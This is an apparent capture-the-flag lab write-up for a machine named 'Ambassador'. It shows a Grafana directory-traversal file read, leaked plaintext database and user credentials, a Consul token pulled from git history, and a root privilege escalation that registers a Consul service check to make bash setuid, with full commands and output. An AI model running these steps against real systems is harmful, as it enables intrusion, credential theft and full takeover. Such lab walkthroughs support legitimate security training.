![ambassador.png](ambassador.png)  

# Ambassador

## Enum
```
22   - OpenSSH 8.2p1 (Ubuntu)
80   - Apache 2.4.41 (Ubuntu)
3000 - Graffana v8.2.0 - d7f71e9eae
3306 - MySQL 8.0.30-0 ubuntu0.20.04.2
```
The page on port 80 says devops will give you the password to developer. ok.
```bash
 dirsearch -u http://example.org                                                                                                                                                         130 ⨯

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10927

Output File: /home/blnkn/.dirsearch/reports/example.org/_22-10-08_17-06-02.txt

Error Log: /home/blnkn/.dirsearch/logs/errors-22-10-08_17-06-02.log

Target: http://example.org/

[17:06:02] Starting:
[17:06:04] 403 -  276B  - /.htaccess.orig
[17:06:04] 403 -  276B  - /.htaccess.sample
[17:06:04] 403 -  276B  - /.htaccess.save
[17:06:04] 403 -  276B  - /.ht_wsr.txt
[17:06:04] 403 -  276B  - /.htaccess.bak1
[17:06:04] 403 -  276B  - /.htaccess_sc
[17:06:04] 403 -  276B  - /.html
[17:06:04] 403 -  276B  - /.htm
[17:06:04] 403 -  276B  - /.htaccess_extra
[17:06:04] 403 -  276B  - /.htaccessOLD2
[17:06:04] 403 -  276B  - /.htaccessBAK
[17:06:04] 403 -  276B  - /.htpasswd_test
[17:06:04] 403 -  276B  - /.htpasswds
[17:06:04] 403 -  276B  - /.htaccessOLD
[17:06:04] 403 -  276B  - /.httr-oauth
[17:06:04] 403 -  276B  - /.htaccess_orig
[17:06:06] 200 -    2KB - /404.html
[17:06:14] 301 -  315B  - /categories  ->  http://example.org/categories/
[17:06:19] 301 -  311B  - /images  ->  http://example.org/images/
[17:06:19] 200 -  992B  - /images/
[17:06:19] 200 -    4KB - /index.html
[17:06:19] 200 -    1KB - /index.xml
[17:06:25] 301 -  310B  - /posts  ->  http://example.org/posts/
[17:06:26] 403 -  276B  - /server-status
[17:06:26] 403 -  276B  - /server-status/
[17:06:27] 200 -  645B  - /sitemap.xml
[17:06:29] 301 -  309B  - /tags  ->  http://example.org/tags/

Task Completed
```

[https://gohugo.io/](https://gohugo.io/)  
[https://gohugo.io/getting-started/installing#fetch-from-github](https://gohugo.io/getting-started/installing#fetch-from-github)  
[https://github.com/gohugoio/hugo](https://github.com/gohugoio/hugo)  


## Grafana 8.0.0 -> 8.3.0 - Directory traversal

we know that grafana is 8.2.0 and the Directory Traversal vulnerability bellow is from 8.0.0 to 8.3.0
```bash
searchsploit grafana
--------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                             |  Path
--------------------------------------------------------------------------- ---------------------------------
Grafana 7.0.1 - Denial of Service (PoC)                                    | linux/dos/48638.sh
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                | multiple/webapps/50581.py
--------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
and it works indeed
```bash
python3 grafana-traversal.py -H http://example.org:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:110:1::/var/cache/pollinate:/bin/false
usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
grafana:x:113:118::/usr/share/grafana:/bin/false
mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
consul:x:997:997::/home/consul:/bin/false

Read file >
```
```bash
grep sh$ passwd
root:x:0:0:root:/root:/bin/bash
developer:x:1000:1000:developer:/home/developer:/bin/bash
```
```bash
grep graf passwd
grafana:x:113:118::/usr/share/grafana:/bin/false
```

looking at the documentation for grafana, we're pulling the default config location for an ubuntu install
```bash
/etc/grafana/grafana.ini
```
the only non default config is the admin password
and it successfully logs us in the admin portal
```
admin_password = messageInABottle685427
```
the portal shows that the config file for the datasource is "mysql.yaml"   
again looking a little into the documentation, we're pulling the mysql datasource config file with the same exploit  
and that gives us the  password for the grafana mysql database user  
```yaml
Read file > /etc/grafana/provisioning/datasources/mysql.yaml
apiVersion: 1

datasources:
 - name: mysql.yaml
   type: mysql
   host: localhost
   database: grafana
   user: grafana
   password: dontStandSoCloseToMe63221!
   editable: false
```


## Connecting to the MySQL database
as we know the db is exposed to over the network, so at this stage nothing prevents us from connecting directly  
```sql
mysql -u grafana -p -h example.org -D grafana
```

```sql
MySQL [whackywidget]> select * from users;
+-----------+------------------------------------------+
| user      | pass                                     |
+-----------+------------------------------------------+
| developer | YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg== |
+-----------+------------------------------------------+
```
the password isn't even hashed that's embarassing
```bash
printf 'YW5FbmdsaXNoTWFuSW5OZXdZb3JrMDI3NDY4Cg=='|base64 -d
anEnglishManInNewYork027468
```
```bash
developer@ambassador:~$ wc -c user.txt
33 user.txt
```

## Forraging git history for tokens

```bash
sudo -l
[sudo] password for developer:
Sorry, user developer may not run sudo on ambassador.
```
the git config in the developer users's home points to /opt/my-app where the whacky app thing resides 
```bash
cat .gitconfig
[user]
        name = Developer
        email = developer@ambassador.local
[safe]
        directory = /opt/my-app
```

so we can look at the git logs in there 
```bash
 git log --oneline
33a53ef (HEAD -> main) tidy config script
c982db8 config script
8dce657 created project with django CLI
4b8597b .gitignore
```
and get a token to talk to the consul API
```bash
git show 33a53ef
commit 33a53ef9a207976d5ceceddc41a199558843bf3c (HEAD -> main)
Author: Developer <developer@ambassador.local>
Date:   Sun Mar 13 23:47:36 2022 +0000

    tidy config script

diff --git a/whackywidget/put-config-in-consul.sh b/whackywidget/put-config-in-consul.sh
index 35c08f6..fc51ec0 100755
--- a/whackywidget/put-config-in-consul.sh
+++ b/whackywidget/put-config-in-consul.sh
@@ -1,4 +1,4 @@
 # We use Consul for application config in production, this script will help set the correct values for the app
-# Export MYSQL_PASSWORD before running
+# Export MYSQL_PASSWORD and CONSUL_HTTP_TOKEN before running

-consul kv put --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw $MYSQL_PASSWORD
+consul kv put whackywidget/db/mysql_pw $MYSQL_PASSWORD
```

looks like this thing offers some kind of secret management: 
```bash
consul kv get --token bb03b43b-1d81-d62b-24b5-39540ee469b5 whackywidget/db/mysql_pw
dontStandSoCloseToMe63221!
```

but there's nothing in there that we don't already know 
```bash
consul kv export --token bb03b43b-1d81-d62b-24b5-39540ee469b5
[
        {
                "key": "test",
                "flags": 0,
                "value": "aGVsbG8="
        },
        {
                "key": "whackywidget/db/mysql_pw",
                "flags": 0,
                "value": "ZG9udFN0YW5kU29DbG9zZVRvTWU2MzIyMSE="
        }
]
```

there's also the Django secret key, I believe that might allow us to do some attacks on the cryptography related methods in django, not sure that's relevant right now.
```bash
+# Quick-start development settings - unsuitable for production
+# See https://docs.djangoproject.com/en/4.0/howto/deployment/checklist/
+
+# SECURITY WARNING: keep the secret key used in production secret!
+SECRET_KEY = 'django-insecure--lqw3fdyxw(28h#0(w8_te*wm*6ppl@g!ttcpo^m-ig!qtqy!l'
```


## Exploring the inner workings of Consul
I know very little about consul, but from what I started reading this is a mesh networking solution for microservice oriented architectures. So in theory this is used to connect various containers accross nodes and datacenters. I don't believe there's any kubernetes running here, but there's lxd. I'll need to poke around to understand what consul really offers and how it works.  

ports that seem related to consul
```bash
netstat -tulpen|grep 127.0.0.1:8|grep tcp
tcp        0      0 127.0.0.1:8300          0.0.0.0:*               LISTEN      0          38103      -
tcp        0      0 127.0.0.1:8301          0.0.0.0:*               LISTEN      0          38108      -
tcp        0      0 127.0.0.1:8302          0.0.0.0:*               LISTEN      0          38105      -
tcp        0      0 127.0.0.1:8500          0.0.0.0:*               LISTEN      0          38122      -
tcp        0      0 127.0.0.1:8600          0.0.0.0:*               LISTEN      0          38119      -
```
[https://www.consul.io/docs/install/ports](https://www.consul.io/docs/install/ports)
```
8300 -> Server RPC            - This is used by servers to handle incoming requests from other agents
8301 -> LAN Serf              - used to handle gossip in the LAN. Required by all agents
8302 -> WAN Serf              - used by servers to gossip over the WAN, to other servers
8500 -> consul agent HTTP API - used by clients to talk to the HTTP API (ui disabled in our case)
8600 -> consul DNS            - resolve DNS queries
```

so the commands bellow are just a dump of things I tried:

```bash
CONSUL_HTTP_TOKEN=bb03b43b-1d81-d62b-24b5-39540ee469b5
export CONSUL_HTTP_TOKEN 
consul kv get whackywidget/db/mysql_pw
consul kv export 
consul acl token list
consul acl token read -self
consul catalog datacenters
consul catalog nodes
consul catalog services
consul reload
consul exec -node=ambassador 'ip a'   # Not working 
```

## Command Execution with the Consul Service API

[https://www.consul.io/api-docs/api-structure](https://www.consul.io/api-docs/api-structure)   
[https://www.consul.io/api-docs/agent/service#register-service](https://www.consul.io/api-docs/agent/service#register-service)   
first I'll be forwarding the agent port to my local machine so I can use jq
```bash
ssh -fNL 8500:localhost:8500 developer@example.org
```
listing all existing services
```bash
curl -s \
  -H "X-Consul-Token: ${token}" \
  -X GET 'http://127.0.0.1:8500/v1/agent/services' |\
  jq "."
```
```json
{
  "meow": {
    "ID": "meow",
    "Service": "meow",
    "Tags": [],
    "Meta": {},
    "Port": 80,
    "Address": "127.0.0.1",
    "TaggedAddresses": {
      "lan_ipv4": {
        "Address": "127.0.0.1",
        "Port": 80
      },
      "wan_ipv4": {
        "Address": "127.0.0.1",
        "Port": 80
      }
    },
    "Weights": {
      "Passing": 1,
      "Warning": 1
    },
    "EnableTagOverride": false,
    "Datacenter": "dc1"
  },
  "svc111": {
    "ID": "svc111",
    "Service": "svc111",
    "Tags": [
      "default"
    ],
    "Meta": {},
    "Port": 0,
    "Address": "",
    "Weights": {
      "Passing": 1,
      "Warning": 1
    },
    "EnableTagOverride": false,
    "Datacenter": "dc1"
  }
}
```
listing a specific service
```bash
curl -s \
  -H "X-Consul-Token: ${token}" \
  -X GET 'http://127.0.0.1:8500/v1/agent/service/meow' |\
  jq "."
```
```json
{
  "ID": "meow",
  "Service": "meow",
  "Tags": [],
  "Meta": {},
  "Port": 80,
  "Address": "127.0.0.1",
  "TaggedAddresses": {
    "lan_ipv4": {
      "Address": "127.0.0.1",
      "Port": 80
    },
    "wan_ipv4": {
      "Address": "127.0.0.1",
      "Port": 80
    }
  },
  "Weights": {
    "Passing": 1,
    "Warning": 1
  },
  "EnableTagOverride": false,
  "ContentHash": "8fb6dc4f012493d5",
  "Datacenter": "dc1"
}
```

writing a bash script in /tmp that will make a suid bash 
```bash
echo 'chmod +s /usr/bin/bash' > blnkn.sh
cat blnkn.sh
chmod +s /usr/bin/bash
chmod +x blnkn.sh
 which bash
/usr/bin/bash
ls -la $(which bash)
-rwxr-xr-x 1 root root 1183448 Apr 18 09:14 /usr/bin/bash
```

and creating a service that calls that bash script as a check
```bash
curl -s \
  -H "X-Consul-Token: ${token}" \
  -X PUT 'http://127.0.0.1:8500/v1/agent/service/register' \
  -d '{
  "ID": "blnkn",
  "Name": "blnkn",
  "Address": "127.0.0.1",
  "Port": 80,
  "check": {
    "Args": [
      "/usr/bin/bash",
      "/tmp/blnkn.sh"
    ],
    "interval": "10s",
    "timeout": "1s"
  }
}'
```

checking that my service has been created 
```bash
curl -s \
  -H "X-Consul-Token: ${token}" \
  -X GET 'http://127.0.0.1:8500/v1/agent/service/blnkn' |\
  jq "."
```
```json
{
  "ID": "blnkn",
  "Service": "blnkn",
  "Tags": [],
  "Meta": {},
  "Port": 80,
  "Address": "127.0.0.1",
  "TaggedAddresses": {
    "lan_ipv4": {
      "Address": "127.0.0.1",
      "Port": 80
    },
    "wan_ipv4": {
      "Address": "127.0.0.1",
      "Port": 80
    }
  },
  "Weights": {
    "Passing": 1,
    "Warning": 1
  },
  "EnableTagOverride": false,
  "ContentHash": "fd910d44cc6214e9",
  "Datacenter": "dc1"
}
```
yep
```bash
consul catalog services
blnkn
consul
meow
svc111
```
and now bash is suid, so we can run it with preserve and it won't drop root permissions. 
```bash
ls -la $(which bash)
-rwsr-sr-x 1 root root 1183448 Apr 18 09:14 /usr/bin/bash
bash -p
id
uid=1000(developer) gid=1000(developer) euid=0(root) egid=0(root) groups=0(root),1000(developer)
cd /root/
wc -c root.txt
33 root.txt
```
